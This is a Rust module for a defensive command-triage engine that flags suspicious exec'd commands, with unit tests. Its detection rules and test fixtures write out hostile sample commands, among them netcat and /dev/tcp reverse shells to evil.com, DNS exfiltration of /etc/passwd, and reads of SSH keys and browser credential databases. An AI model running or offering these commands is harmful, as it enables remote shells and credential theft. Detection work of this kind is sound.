//! Deterministic command triage layer.
//!
//! Classifies exec'd commands as benign or suspicious based on identity and arguments.
//! Only suspicious results are surfaced; benign/unknown commands return `None`.
//!
//! Seven engines run in sequence; the first non-`Unknown` result wins:
//! 1. SafeByIdentity — always-safe, side-effect-free commands
//! 2. BuildAndDev — build toolchains
//! 3. TextProcessing — text transforms
//! 4. PackageAndVCS — package managers and version control
//! 5. FileOperations — file ops, suspicious if args hit sensitive paths
//! 6. NetworkAndShell — policy-noteworthy commands, suspicious if specific signals detected
//! 7. DangerousPatterns — cross-command catch-all for universal danger signals

use super::files::normalize_path;
use malwi_intercept::glob::matches_glob;
use malwi_policy::templates::taxonomy::{self, Category};

/// Result of command analysis when a suspicious pattern is detected.
#[allow(dead_code)]
pub struct CommandAnalysis {
    /// Human-readable description of why this is suspicious.
    pub reason: String,
    /// Machine-readable rule identifier.
    pub rule_id: &'static str,
    /// Optional target (file path, URL, etc.) that triggered the rule.
    pub target: Option<String>,
}

/// Triage a command. Returns `None` if benign, `Some` if suspicious.
///
/// * `basename` — command name (no path).
/// * `argv` — full argument vector (argv\[0\] = command name).
/// * `sensitive_patterns` — file deny patterns from the active policy.
/// * `command_patterns` — command deny/warn patterns from the active policy.
pub fn analyze_command(
    basename: &str,
    argv: &[&str],
    sensitive_patterns: &[&str],
    command_patterns: &[&str],
) -> Option<CommandAnalysis> {
    let ctx = EngineContext {
        basename,
        argv,
        sensitive_patterns,
        command_patterns,
    };

    for engine in ENGINES {
        match engine(&ctx) {
            Triage::Benign => return None,
            Triage::Suspicious {
                reason,
                rule_id,
                target,
            } => {
                return Some(CommandAnalysis {
                    reason,
                    rule_id,
                    target,
                });
            }
            Triage::Unknown => continue,
        }
    }

    // No engine matched → benign by default
    None
}

// ---------------------------------------------------------------------------
// Internal types
// ---------------------------------------------------------------------------

enum Triage {
    Benign,
    Suspicious {
        reason: String,
        rule_id: &'static str,
        target: Option<String>,
    },
    Unknown,
}

struct EngineContext<'a> {
    basename: &'a str,
    argv: &'a [&'a str],
    sensitive_patterns: &'a [&'a str],
    command_patterns: &'a [&'a str],
}

type Engine = fn(&EngineContext) -> Triage;

const ENGINES: &[Engine] = &[
    engine_safe_by_identity,
    engine_build_and_dev,
    engine_text_processing,
    engine_package_and_vcs,
    engine_file_operations,
    engine_network_and_shell,
    engine_dangerous_patterns,
];

// ---------------------------------------------------------------------------
// Engine 1: SafeByIdentity
// ---------------------------------------------------------------------------

fn engine_safe_by_identity(ctx: &EngineContext) -> Triage {
    match taxonomy::get().lookup(ctx.basename) {
        Some(Category::Safe) => Triage::Benign,
        _ => Triage::Unknown,
    }
}

// ---------------------------------------------------------------------------
// Engine 2: BuildAndDev
// ---------------------------------------------------------------------------

fn engine_build_and_dev(ctx: &EngineContext) -> Triage {
    match taxonomy::get().lookup(ctx.basename) {
        Some(Category::Build) => Triage::Benign,
        _ => Triage::Unknown,
    }
}

// ---------------------------------------------------------------------------
// Engine 3: TextProcessing
// ---------------------------------------------------------------------------

fn engine_text_processing(ctx: &EngineContext) -> Triage {
    match taxonomy::get().lookup(ctx.basename) {
        Some(Category::Text) => Triage::Benign,
        _ => Triage::Unknown,
    }
}

// ---------------------------------------------------------------------------
// Engine 4: PackageAndVCS
// ---------------------------------------------------------------------------

fn engine_package_and_vcs(ctx: &EngineContext) -> Triage {
    match taxonomy::get().lookup(ctx.basename) {
        Some(Category::Package) => Triage::Benign,
        _ => Triage::Unknown,
    }
}

// ---------------------------------------------------------------------------
// Engine 5: FileOperations
// ---------------------------------------------------------------------------

fn engine_file_operations(ctx: &EngineContext) -> Triage {
    if !matches!(
        taxonomy::get().lookup(ctx.basename),
        Some(Category::FileOperation)
    ) {
        return Triage::Unknown;
    }

    let paths = extract_file_paths(ctx.basename, ctx.argv);

    for path in &paths {
        let normalized = normalize_path(path);
        if matches_any_sensitive(&normalized, ctx.sensitive_patterns) {
            return Triage::Suspicious {
                reason: format!("file operation on sensitive path: {}", path),
                rule_id: "sensitive_path",
                target: Some(path.to_string()),
            };
        }
    }

    Triage::Benign
}

/// Check if a normalized path matches any sensitive pattern.
///
/// Also checks with a trailing `/` appended so that directory references
/// like `~/.ssh` match glob patterns like `*/.ssh/**`.
fn matches_any_sensitive(path: &str, sensitive_patterns: &[&str]) -> bool {
    for pattern in sensitive_patterns {
        if matches_glob(pattern, path) {
            return true;
        }
    }
    // Retry with trailing / to catch directory references against /** patterns
    if !path.ends_with('/') {
        let dir_path = format!("{}/", path);
        for pattern in sensitive_patterns {
            if matches_glob(pattern, &dir_path) {
                return true;
            }
        }
    }
    false
}

/// Extract file path arguments from a command's argv.
fn extract_file_paths<'a>(basename: &str, argv: &'a [&'a str]) -> Vec<&'a str> {
    let args = if argv.len() > 1 {
        &argv[1..]
    } else {
        return vec![];
    };

    if basename == "dd" {
        let mut paths = Vec::new();
        for arg in args {
            if let Some(path) = arg.strip_prefix("if=") {
                paths.push(path);
            } else if let Some(path) = arg.strip_prefix("of=") {
                paths.push(path);
            }
        }
        return paths;
    }

    // Default: non-flag arguments are treated as paths
    args.iter()
        .filter(|a| !a.starts_with('-') && !a.is_empty())
        .copied()
        .collect()
}

// ---------------------------------------------------------------------------
// Engine 6: NetworkAndShell
// ---------------------------------------------------------------------------

fn engine_network_and_shell(ctx: &EngineContext) -> Triage {
    // Only inspect commands the policy considers noteworthy
    let is_noteworthy = ctx
        .command_patterns
        .iter()
        .any(|p| matches_glob(p, ctx.basename));
    if !is_noteworthy {
        return Triage::Unknown;
    }

    let args: &[&str] = if ctx.argv.len() > 1 {
        &ctx.argv[1..]
    } else {
        &[]
    };

    // File protocol (curl/wget with file://)
    if ctx.basename == "curl" || ctx.basename == "wget" {
        for arg in args {
            if arg.starts_with("file://") {
                return Triage::Suspicious {
                    reason: format!("{} with file:// protocol", ctx.basename),
                    rule_id: "file_protocol",
                    target: Some(arg.to_string()),
                };
            }
        }
    }

    // Netcat exec flag
    if ctx.basename == "nc" || ctx.basename == "ncat" {
        if args.iter().any(|a| *a == "-e" || *a == "--exec") {
            return Triage::Suspicious {
                reason: format!("{} with -e (exec)", ctx.basename),
                rule_id: "nc_exec",
                target: None,
            };
        }
    }

    // Base64 decode
    if ctx.basename == "base64" {
        if args
            .iter()
            .any(|a| *a == "-d" || *a == "--decode" || *a == "-D")
        {
            return Triage::Suspicious {
                reason: "base64 decode".to_string(),
                rule_id: "base64_decode",
                target: None,
            };
        }
    }

    // Credential database access via sqlite3
    if ctx.basename == "sqlite3" {
        const CREDENTIAL_DBS: &[&str] =
            &["Login Data", "cookies.sqlite", "logins.json", "keychain"];
        for arg in args {
            if !arg.starts_with('-') {
                for db in CREDENTIAL_DBS {
                    if arg.contains(db) {
                        return Triage::Suspicious {
                            reason: format!("sqlite3 accessing credential database: {}", arg),
                            rule_id: "credential_db",
                            target: Some(arg.to_string()),
                        };
                    }
                }
            }
        }
    }

    // Reverse shell via /dev/tcp or /dev/udp
    if ctx.basename == "bash" || ctx.basename == "sh" || ctx.basename == "zsh" {
        for arg in args {
            if arg.contains("/dev/tcp/") || arg.contains("/dev/udp/") {
                return Triage::Suspicious {
                    reason: format!("{} with /dev/tcp or /dev/udp", ctx.basename),
                    rule_id: "reverse_shell",
                    target: Some(arg.to_string()),
                };
            }
        }
    }

    // DNS exfiltration via command substitution
    if ctx.basename == "dig" || ctx.basename == "nslookup" || ctx.basename == "host" {
        for arg in args {
            if arg.contains("$(") || arg.contains('`') {
                return Triage::Suspicious {
                    reason: format!("{} with command substitution", ctx.basename),
                    rule_id: "dns_exfil",
                    target: Some(arg.to_string()),
                };
            }
        }
    }

    // No suspicious signal → benign for this noteworthy command
    Triage::Benign
}

// ---------------------------------------------------------------------------
// Engine 7: DangerousPatterns (cross-command catch-all)
// ---------------------------------------------------------------------------

fn engine_dangerous_patterns(ctx: &EngineContext) -> Triage {
    let args: &[&str] = if ctx.argv.len() > 1 {
        &ctx.argv[1..]
    } else {
        &[]
    };

    for arg in args {
        // Reverse shell
        if arg.contains("/dev/tcp/") || arg.contains("/dev/udp/") {
            return Triage::Suspicious {
                reason: "argument contains /dev/tcp or /dev/udp".to_string(),
                rule_id: "reverse_shell",
                target: Some(arg.to_string()),
            };
        }

        // File protocol
        if arg.starts_with("file://") {
            return Triage::Suspicious {
                reason: "file:// protocol in argument".to_string(),
                rule_id: "file_protocol",
                target: Some(arg.to_string()),
            };
        }

        // Sensitive path in non-flag arguments
        if !arg.starts_with('-') && !arg.is_empty() {
            let normalized = normalize_path(arg);
            if matches_any_sensitive(&normalized, ctx.sensitive_patterns) {
                return Triage::Suspicious {
                    reason: format!("argument references sensitive path: {}", arg),
                    rule_id: "sensitive_path",
                    target: Some(arg.to_string()),
                };
            }
        }
    }

    Triage::Unknown
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Standard sensitive file patterns (matching the default policy's files: deny/warn).
    const SENSITIVE: &[&str] = &[
        "~/.ssh/**",
        "*/.ssh/**",
        "~/.aws/**",
        "*/.aws/**",
        "*.pem",
        "*.key",
        "*id_rsa*",
        "*id_ed25519*",
    ];

    /// Standard command patterns (subset of the default policy's commands: deny/warn/log).
    const COMMANDS: &[&str] = &[
        "curl", "wget", "nc", "ncat", "base64", "sqlite3", "bash", "sh", "zsh", "dig", "nslookup",
        "host", "sudo", "ssh", "kill",
    ];

    // =================================================================
    // SafeByIdentity — always benign
    // =================================================================

    #[test]
    fn test_safe_command_echo_is_benign() {
        assert!(analyze_command("echo", &["echo", "hello"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_safe_command_ls_is_benign() {
        assert!(analyze_command("ls", &["ls", "-la"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_safe_command_date_is_benign() {
        assert!(analyze_command("date", &["date", "+%Y"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_safe_command_whoami_is_benign() {
        assert!(analyze_command("whoami", &["whoami"], SENSITIVE, COMMANDS).is_none());
    }

    // =================================================================
    // BuildAndDev — always benign
    // =================================================================

    #[test]
    fn test_build_tool_make_is_benign() {
        assert!(analyze_command("make", &["make", "build"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_build_tool_gcc_is_benign() {
        assert!(
            analyze_command("gcc", &["gcc", "-o", "main", "main.c"], SENSITIVE, COMMANDS).is_none()
        );
    }

    // =================================================================
    // TextProcessing — always benign
    // =================================================================

    #[test]
    fn test_text_tool_grep_is_benign() {
        assert!(
            analyze_command("grep", &["grep", "-r", "pattern", "."], SENSITIVE, COMMANDS).is_none()
        );
    }

    #[test]
    fn test_text_tool_sort_is_benign() {
        assert!(analyze_command("sort", &["sort", "file.txt"], SENSITIVE, COMMANDS).is_none());
    }

    // =================================================================
    // PackageAndVCS — always benign
    // =================================================================

    #[test]
    fn test_package_vcs_git_is_benign() {
        assert!(analyze_command(
            "git",
            &["git", "clone", "https://github.com/x/y"],
            SENSITIVE,
            COMMANDS
        )
        .is_none());
    }

    #[test]
    fn test_package_vcs_npm_is_benign() {
        assert!(analyze_command("npm", &["npm", "install"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_package_vcs_pip_is_benign() {
        assert!(
            analyze_command("pip", &["pip", "install", "flask"], SENSITIVE, COMMANDS).is_none()
        );
    }

    // =================================================================
    // FileOperations — benign unless sensitive path
    // =================================================================

    #[test]
    fn test_file_op_cp_safe_paths_is_benign() {
        assert!(analyze_command("cp", &["cp", "/tmp/a", "/tmp/b"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_file_op_cat_readme_is_benign() {
        assert!(analyze_command("cat", &["cat", "README.md"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_file_op_tar_safe_paths_is_benign() {
        assert!(
            analyze_command("tar", &["tar", "xf", "archive.tar.gz"], SENSITIVE, COMMANDS).is_none()
        );
    }

    #[test]
    fn test_file_op_ln_ssh_key_is_suspicious() {
        let result = analyze_command("ln", &["ln", "-s", "~/.ssh", "/tmp/x"], SENSITIVE, COMMANDS);
        assert!(result.is_some());
        let analysis = result.unwrap();
        assert_eq!(analysis.rule_id, "sensitive_path");
    }

    #[test]
    fn test_file_op_tar_aws_creds_is_suspicious() {
        let result = analyze_command(
            "tar",
            &["tar", "czf", "out.tgz", "~/.aws/"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        let analysis = result.unwrap();
        assert_eq!(analysis.rule_id, "sensitive_path");
    }

    #[test]
    fn test_file_op_dd_sensitive_input_is_suspicious() {
        let result = analyze_command(
            "dd",
            &["dd", "if=/home/user/.ssh/id_rsa", "of=/tmp/out"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "sensitive_path");
    }

    #[test]
    fn test_file_op_dd_safe_paths_is_benign() {
        assert!(analyze_command(
            "dd",
            &["dd", "if=/dev/zero", "of=/tmp/out", "bs=1M", "count=1"],
            SENSITIVE,
            COMMANDS
        )
        .is_none());
    }

    // =================================================================
    // NetworkAndShell — noteworthy commands, signal-based
    // =================================================================

    #[test]
    fn test_network_curl_https_is_benign() {
        assert!(analyze_command(
            "curl",
            &["curl", "https://example.com"],
            SENSITIVE,
            COMMANDS
        )
        .is_none());
    }

    #[test]
    fn test_network_curl_file_protocol_is_suspicious() {
        let result = analyze_command("curl", &["curl", "file:///etc/passwd"], SENSITIVE, COMMANDS);
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "file_protocol");
    }

    #[test]
    fn test_network_nc_exec_flag_is_suspicious() {
        let result = analyze_command(
            "nc",
            &["nc", "-e", "/bin/sh", "evil.com", "4444"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "nc_exec");
    }

    #[test]
    fn test_network_base64_decode_is_suspicious() {
        let result = analyze_command("base64", &["base64", "-d"], SENSITIVE, COMMANDS);
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "base64_decode");
    }

    #[test]
    fn test_network_base64_encode_is_benign() {
        assert!(analyze_command("base64", &["base64", "file.txt"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_network_sqlite3_credential_db_is_suspicious() {
        let result = analyze_command(
            "sqlite3",
            &[
                "sqlite3",
                "~/Library/Application Support/Google/Chrome/Default/Login Data",
            ],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "credential_db");
    }

    #[test]
    fn test_network_sqlite3_safe_path_is_benign() {
        assert!(analyze_command(
            "sqlite3",
            &["sqlite3", "/tmp/mydb.sqlite"],
            SENSITIVE,
            COMMANDS
        )
        .is_none());
    }

    #[test]
    fn test_network_bash_reverse_shell_is_suspicious() {
        let result = analyze_command(
            "bash",
            &["bash", "-i", ">& /dev/tcp/evil.com/4444"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "reverse_shell");
    }

    #[test]
    fn test_network_bash_safe_script_is_benign() {
        assert!(analyze_command("bash", &["bash", "script.sh"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_network_dig_dns_exfil_is_suspicious() {
        let result = analyze_command(
            "dig",
            &["dig", "$(cat /etc/passwd).evil.com"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "dns_exfil");
    }

    #[test]
    fn test_network_ping_not_noteworthy_skips() {
        // "ping" is not in COMMANDS, so engine 6 returns Unknown, falls through
        assert!(analyze_command("ping", &["ping", "google.com"], SENSITIVE, COMMANDS).is_none());
    }

    // =================================================================
    // DangerousPatterns — cross-command catch-all
    // =================================================================

    #[test]
    fn test_danger_unknown_tool_reverse_shell_is_suspicious() {
        let result = analyze_command(
            "unknown_tool",
            &["unknown_tool", "/dev/tcp/evil.com/4444"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "reverse_shell");
    }

    #[test]
    fn test_danger_unknown_tool_file_protocol_is_suspicious() {
        let result = analyze_command(
            "custom_fetcher",
            &["custom_fetcher", "file:///etc/shadow"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "file_protocol");
    }

    #[test]
    fn test_danger_unknown_tool_sensitive_path_is_suspicious() {
        let result = analyze_command(
            "custom_tool",
            &["custom_tool", "/home/user/.ssh/id_rsa"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "sensitive_path");
    }

    #[test]
    fn test_danger_unknown_tool_safe_args_is_benign() {
        // No dangerous signals → Unknown from engine 7, overall None
        assert!(analyze_command(
            "custom_tool",
            &["custom_tool", "/tmp/ok"],
            SENSITIVE,
            COMMANDS
        )
        .is_none());
    }

    // =================================================================
    // Edge cases
    // =================================================================

    #[test]
    fn test_command_with_no_args_is_benign() {
        assert!(analyze_command("echo", &["echo"], SENSITIVE, COMMANDS).is_none());
    }

    #[test]
    fn test_file_op_empty_sensitive_patterns_is_benign() {
        // With no sensitive patterns, file ops are always benign
        assert!(analyze_command("ln", &["ln", "-s", "~/.ssh", "/tmp/x"], &[], COMMANDS).is_none());
    }

    #[test]
    fn test_danger_catches_file_protocol_without_command_patterns() {
        // With no command patterns, engine 6 skips; engine 7 catches file://
        let result = analyze_command("curl", &["curl", "file:///etc/passwd"], SENSITIVE, &[]);
        // Engine 4/5 don't match curl; engine 6 skips (empty command_patterns);
        // engine 7 catches file:// protocol
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "file_protocol");
    }

    #[test]
    fn test_file_op_flags_not_treated_as_paths() {
        // Flags should not be treated as file paths
        assert!(
            analyze_command("cp", &["cp", "-r", "/tmp/a", "/tmp/b"], SENSITIVE, COMMANDS).is_none()
        );
    }

    #[test]
    fn test_file_op_dotdot_traversal_normalized_and_caught() {
        // Path traversal to sensitive dir
        let result = analyze_command(
            "cat",
            &["cat", "/tmp/../../home/user/.ssh/id_rsa"],
            SENSITIVE,
            COMMANDS,
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().rule_id, "sensitive_path");
    }
}
